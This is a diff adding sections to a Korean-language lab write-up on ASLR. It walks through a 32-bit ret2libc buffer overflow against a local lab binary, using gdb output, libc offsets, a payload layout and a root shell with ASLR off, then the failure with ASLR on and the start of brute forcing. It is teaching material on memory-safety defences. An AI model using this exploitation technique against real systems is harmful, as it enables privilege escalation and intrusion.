@@ -575,11 +575,116 @@ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 
 ---
 
-## 6. ASLR off 상태 바이너리 분석
+## 6. ASLR off 상태
+
+자세한 설명은 생략하고, 주소를 하드코딩한 상태로 쉘 획득이 성공함을 확인한다.
+
+※ `echo 0 | sudo tee /proc/sys/kernel/randomize_va_space` 을 한 뒤 프로세스를 실행해야 ASLR이 적용되지 않는다.
+
+### 6.1 bof offset
+
+``` gdb
+   0x080491bf <+25>:	lea    eax,[ebp-0x20]
+   0x080491c2 <+28>:	push   eax
+   0x080491c3 <+29>:	call   0x8049040 <gets@plt>
+```
+* buf 주소 : ebp-0x20
+* offset = buf + saved ebp = 0x20 + 0x4 = 0x24
+
+### 6.2 base
+
+``` gdb
+(gdb) info proc mappings
+	Start Addr   End Addr       Size     Offset  Perms   objfile
+	0xf7d72000 0xf7d95000    0x23000        0x0  r--p   /usr/lib/i386-linux-gnu/libc.so.6
+	0xf7d95000 0xf7f1c000   0x187000    0x23000  r-xp   /usr/lib/i386-linux-gnu/libc.so.6
+	0xf7f1c000 0xf7fa1000    0x85000   0x1aa000  r--p   /usr/lib/i386-linux-gnu/libc.so.6
+	0xf7fa1000 0xf7fa3000     0x2000   0x22f000  r--p   /usr/lib/i386-linux-gnu/libc.so.6
+	0xf7fa3000 0xf7fa4000     0x1000   0x231000  rw-p   /usr/lib/i386-linux-gnu/libc.so.6
+```
+따라서 base = 0xf7d72000
+
+### 6.3 libc offset
+
+``` bash
+$ readelf -s /usr/lib/i386-linux-gnu/libc.so.6 | grep " system@@"
+  1147: 00050430    63 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.0
+$ readelf -s /usr/lib/i386-linux-gnu/libc.so.6 | grep " exit@@"
+   579: 0003ebd0    39 FUNC    GLOBAL DEFAULT   15 exit@@GLIBC_2.0
+$ strings -a -t x /usr/lib/i386-linux-gnu/libc.so.6 | grep "/bin/sh"
+ 1c4de8 /bin/sh
+```
+
+### 6.4 페이로드
+
+페이로드 구조:
+```
+[padding][system][exit]["/bin/sh"]
+```
+
+페이로드 삽입 후 스택 레이아웃:
+```
++------------------+
+|  "/bin/sh" addr  | system()의 인자 역할
++------------------+
+|     exit addr    | system()의 saved RET 역할
++------------------+
+|   system() addr  | vuln()의 saved RET 위치 : ret2libc 체인 시작점
++------------------+
+|       AAAA       | vuln()의 saved EBP 위치
++------------------+ ← ebp
+|        ...       |
++------------------+ 
+|       AAAA       | buf
++------------------+ [ebp-0x20] = &buf
+```
+
+### 6.5 결과
+
+```
+$ (python3 payload.py; cat) | /tmp/aslr-lab/aslr
+input:
+
+id
+uid=0(root) gid=1000(name) groups=1000(name),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin)
+^C
+```
+
+ASLR이 off된 상태에서는 libc의 base가 변하지 않으므로, </br>
+libc 내부 주소를 하드코딩하여 payload를 작성했을 때 쉘 획득에 성공한다.
 
 ---
 
-## 7. ASLR on 상태 바이너리 분석
+## 7. ASLR on 상태
+
+### 7.1 하드코딩 주소 페이로드 주입
+
+ASLR을 활성화한 뒤 동일한 payload를 다시 입력하면 exploit은 실패한다.</br>
+이는 payload에 포함된 system, exit, "/bin/sh" 주소가 이전 실행의 libc base를 기준으로 계산되었기 때문이다. </br>
+ASLR 활성화 상태에서는 libc base가 실행마다 달라지므로, 하드코딩된 주소는 더 이상 유효하지 않다.
+
+```
+$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
+2
+$ (python3 payload.py; cat) | /tmp/aslr-lab/aslr
+input:
+
+id
+Segmentation fault (core dumped)
+```
+
+페이로드에 하드코딩한 주소가 유효하지 않아, Segmentation fault 가 발생하며 프로그램이 죽었다.
+
+### 7.2 brute force
+
+ASLR이 주소 예측을 어렵게 만들지만
+32bit 환경에서는 엔트로피가 낮아 brute force 공격이 가능하다.
+
+우선, `bruteforce.sh`로 매 프로세스 마다 페이로드를 주입하기 위해 `payload.bin`을 생성했다.
+
+```
+$ python3 payload.py > payload.bin
+```
 
 ---
 
